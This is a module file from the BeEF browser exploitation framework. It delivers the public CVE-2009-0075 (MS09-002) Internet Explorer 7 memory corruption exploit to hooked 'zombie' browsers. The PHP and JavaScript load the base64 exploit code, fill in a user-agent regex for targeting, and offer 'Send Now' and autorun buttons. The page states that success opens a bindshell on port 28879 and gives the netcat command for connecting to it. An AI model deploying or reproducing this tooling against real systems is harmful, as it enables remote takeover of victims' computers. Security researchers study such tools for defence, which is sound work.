<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: http://www.milw0rm.com/exploits/8079
BeEF: the following is the boiler plate from the exploit

Internet Explorer 7 Uninitialized Memory Corruption Exploit

http://www.microsoft.com/technet/security/bulletin/MS09-002.mspx

Abyssec Inc Public Exploits 2009/2/18

this Exploit is based on N/A PoC in Milw0rm but The PoC was really simple to
exploit this PoC can be exploit on DEP-Enabled System As well using .Net 
Shellcode trick or etc mayve i write Dep-Enabled version too And also 
i should notice , this code can modify to be more reliable ..

Feel free to visit us at : www.Abyssec.com
to contact me directly use : admin@abyssec.com

Note : Tested and Worked On XP SP2  please wait for another version

// Skyland win32 bindshell (28876/tcp) shellcode
// If you want an evill Shellcode go ahead !!!

-->

<script>

	function get_b64_code_2009_0075() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "REGEXP", document.cmd_form.regexp.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('CVE-2009-0075 (MS09-002)', get_b64_code_2009_0075());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_2009_0075());
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">CVE-2009-0075 (MS09-002)</div>
Internet Explorer 7 Uninitialized Memory Corruption Exploit. This module targets
Windows XP SP2. Successful exploitation will start a bindshell listening on port 
28879.<br><br>

The following command will connect to the listening bindshell:
<pre>
    nc zombieip 28879
</pre>

<div id="module_subsection">
	<form name="cmd_form">
		<div id="module_subsection_header">UserAgent Regexp</div>
		<input type="text" name="regexp" value="/.*Windows.*/"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>	
	</form>
</div>

